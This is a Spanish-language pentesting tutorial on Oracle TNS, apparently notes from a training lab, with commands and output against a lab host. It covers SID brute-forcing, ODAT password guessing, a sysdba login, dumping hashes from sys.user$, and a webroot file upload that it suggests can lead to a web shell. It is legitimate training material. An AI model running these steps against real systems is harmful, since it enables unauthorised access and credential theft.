# Oracle TNS 

---

## 1) ¿Qué es Oracle TNS y por qué existe?

**Oracle Transparent Network Substrate (TNS)** es el **protocolo de comunicación** que permite que:

* **Clientes** (aplicaciones, herramientas, usuarios) se conecten a
* **Servicios Oracle** (principalmente **Oracle Database**, pero también otros componentes)
* **a través de la red**.

Pensalo como “el idioma” que hablan los clientes Oracle y los servicios Oracle para:

* descubrir a qué servicio conectarse,
* negociar parámetros de conexión,
* establecer la sesión,
* y transportar información (incluyendo consultas SQL) de manera confiable.

### 1.1) ¿Por qué es importante en entornos enterprise?

Oracle se usa muchísimo en industrias con **bases grandes y críticas** (salud, finanzas, retail). Por eso, Oracle Net Services/TNS incorpora (o puede incorporar) características como:

* **Resolución de nombres** (mapeo de “nombre de servicio” a “host/puerto”).
* **Gestión de conexiones** (listener, instancias, servicios).
* **Balanceo** y tolerancia a fallos.
* **Seguridad** (incluyendo cifrado y SSL/TLS en versiones modernas).

> En pentesting, esto importa porque el “frente” típico del mundo Oracle en red suele ser el **listener TNS** (muy común en **TCP/1521**). Si está expuesto y mal configurado, puede filtrar información o permitir acceso.

---

## 2) Evolución y capacidades típicas

Con el tiempo, TNS se actualizó para soportar tecnologías más nuevas como:

* **IPv6**
* **SSL/TLS** (para cifrar la capa de transporte/negociación)

Y se usa para:

* **Name resolution** (resolver servicio → destino)
* **Connection management** (control de sesiones y forward al servicio correcto)
* **Load balancing**
* **Security** (cifrado, validación de certificados, etc.)

Además, Oracle provee capacidades para admins/devs:

* monitoreo y análisis de performance,
* reportes y logs,
* gestión de carga de trabajo,
* tolerancia a fallos con “database services”.

---

## 3) Configuración por defecto (lo que deberías esperar ver)

### 3.1) Puerto por defecto

El **listener TNS** típicamente escucha en:

* **TCP/1521**

> Ojo: puede cambiarse durante instalación o luego en config.

### 3.2) Protocolos y interfaces

Históricamente puede soportar distintos protocolos (además de TCP/IP). El listener también puede:

* escuchar en **varias interfaces**
* o en una IP específica / todas.

### 3.3) Gestión remota según versiones

* En **Oracle 8i/9i**: podía administrarse remotamente por defecto.
* En **Oracle 10g/11g**: no de la misma manera (más restringido por defecto).

### 3.4) Seguridad “por defecto” (y por qué igual es atacable)

Se menciona que puede incluir:

* aceptar conexiones de hosts autorizados,
* autenticación básica (hostnames/IP/user/pass),
* cifrado vía Oracle Net Services.

Pero en la práctica, en entornos reales aparecen:

* contraseñas débiles,
* cuentas default (según versión/servicio),
* servicios auxiliares expuestos,
* y configuraciones heredadas.

---

## 4) Archivos clave: `tnsnames.ora` y `listener.ora`

Estos archivos suelen vivir en:

* `$ORACLE_HOME/network/admin`

### 4.1) `tnsnames.ora` (cliente-side)

Es el “diccionario” que usa el **cliente** para traducir un **nombre de servicio** a un **host/puerto** y parámetros de conexión.

Ejemplo dado (tal cual):

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

**Lectura:**

* `ORCL =` → alias “humano” para referirse a este servicio.
* `(PROTOCOL = TCP)` → se conecta por TCP.
* `(HOST = 10.129.11.102)` → IP/hostname destino.
* `(PORT = 1521)` → puerto del listener.
* `(SERVER = DEDICATED)` → modo de servidor (dedicado vs shared).
* `(SERVICE_NAME = orcl)` → **nombre del servicio** que el cliente pide al conectarse.

> El archivo puede tener **muchas entradas** (varias DBs/servicios). También puede incluir autenticación, pooling, balanceo, etc.

### 4.2) `listener.ora` (server-side)

Define cómo se comporta el **listener** (proceso del lado servidor):

* qué direcciones escucha,
* qué SIDs/servicios expone,
* parámetros, rutas, etc.

Ejemplo dado (tal cual):

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

**Qué te está diciendo esto:**

* Hay un SID/servicio descrito como `PDB1`.
* El Oracle Home está en `C:\oracle\product\19.0.0\dbhome_1` (esto sugiere Windows en el ejemplo).
* El listener escucha en:

  * TCP (HOST/PORT)
  * y también IPC con `EXTPROC1521` (uso local/procesos externos).

### 4.3) Resumen mental (muy importante)

* **Cliente**: usa `tnsnames.ora` para resolver “a dónde conecto y con qué nombre de servicio”.
* **Servidor**: usa `listener.ora` para saber “qué expongo y cómo escucho”.

---

## 5) Conceptos críticos: SERVICE_NAME vs SID (y por qué vas a bruteforcear)

En Oracle, un **SID** (*System Identifier*) identifica una **instancia** de base de datos.

* Una “base” puede tener **múltiples instancias**.
* Cada instancia es un conjunto de procesos/memoria que gestionan datos.

Cuando un cliente se conecta, suele indicar:

* el **SERVICIO** (`SERVICE_NAME`) y/o
* el **SID** (según configuración),

para decir “quiero entrar a **esta** instancia/servicio”.

> Si le errás al SID/servicio, la conexión falla. Por eso, una etapa típica de enumeración es **adivinar (guess) SIDs**.

Herramientas típicas para esto:

* `nmap` (scripts NSE)
* `hydra` (en escenarios específicos)
* `odat` (múltiples módulos)

---

## 6) Hardening extra: PL/SQL Exclusion List

Oracle puede usar una **PL/SQL Exclusion List** (`PlsqlExclusionList`):

* es un archivo de texto creado por el usuario,
* se coloca en `$ORACLE_HOME/sqldeveloper`,
* lista paquetes/tipos PL/SQL que se deben **bloquear**.

Funciona como una **blacklist**: esos componentes no se pueden ejecutar (por ejemplo, vía Oracle Application Server).

> En pentest: si está bien aplicada, puede frustrar ciertos vectores que dependen de paquetes PL/SQL peligrosos.

---

## 7) Parámetros comunes en `tnsnames.ora` / conexión (tabla explicada)

A continuación, los campos del contenido y qué significan **en la práctica**:

* **DESCRIPTION**: “bloque” que describe la conexión.
* **ADDRESS**: a dónde conectar (host/puerto).
* **PROTOCOL**: TCP/IPC/etc.
* **PORT**: puerto.
* **CONNECT_DATA**: qué querés del otro lado (service/SID/instancia).
* **INSTANCE_NAME**: instancia específica.
* **SERVICE_NAME**: nombre de servicio.
* **SERVER**: dedicado o compartido.
* **USER / PASSWORD**: credenciales.
* **SECURITY**: settings de seguridad.
* **VALIDATE_CERT / SSL_VERSION**: TLS.
* **CONNECT_TIMEOUT / RECEIVE_TIMEOUT / SEND_TIMEOUT**: timeouts.
* **SQLNET.EXPIRE_TIME**: keepalive/expiración para detectar caídas.
* **TRACE_LEVEL / TRACE_DIRECTORY / TRACE_FILE_NAME**: trazas (útil para troubleshooting).
* **LOG_FILE**: logs.

> Como pentester, cuando veas settings de TLS/validación de cert, pensá: ¿está bien configurado o hay downgrade/malas prácticas?

---

## 8) Preparación de herramientas en Pwnbox (setup)

Antes de enumerar/interactuar, el material sugiere instalar dependencias y ODAT.

Comandos (tal cual):

```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

Y un ejemplo de output parcial (tal cual):

```txt
Hit:1 https://deb.parrot.sh/parrot lory InRelease
Hit:2 https://deb.parrot.sh/direct/parrot lory-security InRelease
Hit:3 https://deb.parrot.sh/parrot lory-backports InRelease
Reading package lists... Done
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
build-essential is already the newest version (12.9).
python3-dev is already the newest version (3.11.2-1+b1).
python3-dev set to manually installed.
libaio1 is already the newest version (0.3.113-4).
libaio1 set to manually installed.

<SNIP>
```

### 8.1) ¿Qué estás instalando realmente?

* `libaio1`: dependencia común para **Oracle Instant Client** / I/O asíncrono.
* `cx_Oracle`: librería Python para conectarse a Oracle (ODAT la usa en varios módulos).
* `odat`: Oracle Database Attacking Tool (enumeración y explotación).
* `scapy`, `pycryptodome`, etc.: dependencias de módulos específicos.

---

## 9) Verificación: ODAT funciona

Probás la ayuda:

```bash
./odat.py -h
```

Output (tal cual, abreviado):

```txt
usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___
           / \|  \ / \|_ _|
          ( o ) o ) o || |
           \_/|__/|_n_||_|
-------------------------------------------
  _        __           _           ___
 / \      |  \         / \         |_ _|
( o )       o )         o |         | |
 \_/racle |__/atabase |_n_|ttacking |_|
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

**Qué es ODAT:**

* Herramienta open-source en Python para **enumerar y explotar** problemas en Oracle.
* Puede ayudar a identificar:

  * nombres/versiones,
  * usuarios,
  * credenciales débiles,
  * misconfigs,
  * y rutas de abuso (file upload, ejecuciones, etc.).

---

## 10) Detección inicial con Nmap (¿está el listener expuesto?)

Escaneo al puerto default:

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

Output (tal cual):

```txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

### 10.1) Cómo interpretar “unauthorized”

Significa que Nmap identifica el listener y versión, pero **no está autenticado** para obtener info adicional o interactuar a cierto nivel.

Igual, ya tenés 3 datos valiosos:

* el puerto está abierto,
* hay un servicio Oracle TNS,
* y una versión aproximada (11.2.0.2.0 en el ejemplo).

---

## 11) Enumeración de SID con Nmap (bruteforce)

Script NSE:

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

Output (tal cual):

```txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute:
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

### 11.1) ¿Qué significa que encontró `XE`?

`XE` suele asociarse a **Oracle Express Edition**.

En este caso, te está diciendo: “hay una instancia/servicio que responde al SID `XE`”.

> En HTB es muy común ver `XE` porque es una versión ligera y fácil de desplegar en labs.

---

## 12) Enumeración avanzada con ODAT

Ejecutar todos los módulos (modo “all”):

```bash
./odat.py all -s 10.129.204.235
```

Output relevante (tal cual, recortado):

```txt
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

### 12.1) Qué pasó acá

* ODAT probó conectividad/config.
* Luego ejecutó módulos que incluyen **password guessing**.
* Detectó cuentas **locked** (bloqueadas), las saltea.
* Y encontró credenciales válidas:

✅ `scott / tiger`

> `scott/tiger` es una combinación clásica de ejemplo/demo en Oracle. En entornos reales puede aparecer por mala higiene o sistemas heredados.

---

## 13) Acceso con `sqlplus` (login real a la DB)

Conectás así:

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

Output (tal cual):

```txt
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

### 13.1) Interpretación del mensaje ORA-28002

No te bloquea el acceso: te avisa que **la contraseña expira pronto**.

### 13.2) Sobre las versiones (detalle que confunde a muchos)

* `SQL*Plus` es la herramienta cliente (acá Release 21.x).
* La base puede ser otra versión (acá **Oracle Database 11g XE 11.2.0.2.0**).

Es normal que el **cliente** sea más nuevo que el **servidor**.

### 13.3) Error común: librerías compartidas

Si aparece:

`sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`

Solución sugerida (tal cual):

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

**Qué hace esto:** agrega la ruta del Instant Client a `ld.so` para que el loader encuentre `libsqlplus.so`.

---

## 14) Enumeración manual dentro de SQL*Plus

### 14.1) Listar tablas disponibles

```sql
select table_name from all_tables;
```

Output (tal cual, recortado):

```txt
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...
```

**Qué es esto:**

* `all_tables` es una vista que muestra tablas accesibles (dependiendo de permisos).
* Ver tablas de auditoría/privilegios ya te da pistas del “mundo Oracle” que hay detrás.

### 14.2) Ver roles asignados al usuario actual

```sql
select * from user_role_privs;
```

Output (tal cual):

```txt
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

**Interpretación:**

* `SCOTT` tiene roles típicos para trabajar (CONNECT/RESOURCE).
* No parece admin.

---

## 15) Intento de escalar: conectar “as sysdba”

El material muestra que se puede intentar:

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

Output (tal cual, recortado):

```txt
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

### 15.1) ¿Qué implica esto?

* Entraste como **SYS** con privilegios altísimos (`DBA`, roles de catálogo, etc.).

**¿Cómo puede pasar?**

* Porque el usuario y el entorno tienen permisos/configuración que lo permiten.
* En real life depende muchísimo del setup (y suele ser un hallazgo crítico si se logra).

> Si podés hacer `as sysdba`, tu superficie de acción se amplía enormemente.

---

## 16) Post-explotación: extraer hashes de contraseñas

Una acción clásica (para cracking offline) es consultar `sys.user$`:

```sql
select name, password from sys.user$;
```

Output (tal cual, recortado):

```txt
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

### 16.1) Qué es esto

* Estás obteniendo **hashes/representaciones** de password en el catálogo.
* Luego podrías intentar cracking con herramientas offline (dependiendo del formato/versión).

> Nota: el material aclara que “no podemos agregar usuarios o modificar”. Eso depende del lab/limitaciones. En un entorno real, con SYS normalmente podrías hacer muchísimo más.

---

## 17) Vector alternativo: upload de archivos (y posible web shell)

Si el servidor tiene un web server y conocés el **document root**, podrías **subir un archivo** y luego pedirlo por HTTP.

Rutas default típicas:

* Linux: `/var/www/html`
* Windows: `C:\inetpub\wwwroot`

> La idea táctica: primero subir algo inocuo (para evitar AV/IDS), validar, y recién después pensar en payloads.

### 17.1) Crear un archivo de prueba

```bash
echo "Oracle File Upload Test" > testing.txt
```

### 17.2) Subirlo con ODAT (`utlfile`)

Comando (tal cual):

```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Output (tal cual):

```txt
[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

### 17.3) Validar desde HTTP con curl

```bash
curl -X GET http://10.129.204.235/testing.txt
```

Output (tal cual):

```txt
Oracle File Upload Test
```

**Qué demuestra esto:**

* Lograste escribir en el webroot.
* El webserver sirve el archivo.

En un pentest, esto suele escalar a:

* subir un archivo con contenido activo (según tecnología del server),
* o usarlo como punto de apoyo para más acceso.

---

## 18) Checklist mental de enumeración Oracle TNS

1. **Descubrir** el listener (por defecto 1521) con `nmap -sV`.
2. **Identificar** versión aproximada (te guía sobre defaults y exploits).
3. **Enumerar SID/SERVICE_NAME** (ej: `oracle-sid-brute`).
4. **Probar ODAT** (`all` o módulos específicos) para:

   * descubrir credenciales,
   * detectar cuentas locked,
   * mapear superficie.
5. **Conectar** con `sqlplus` y enumerar:

   * tablas/vistas,
   * roles/privilegios,
   * información de instancia.
6. Si hay camino a privilegios altos (como `sysdba`), evaluar:

   * extracción de hashes,
   * lectura de info sensible,
   * abusos como `utlfile` (upload), etc.
7. **Validar impacto** (ej: upload en webroot + `curl`).

---




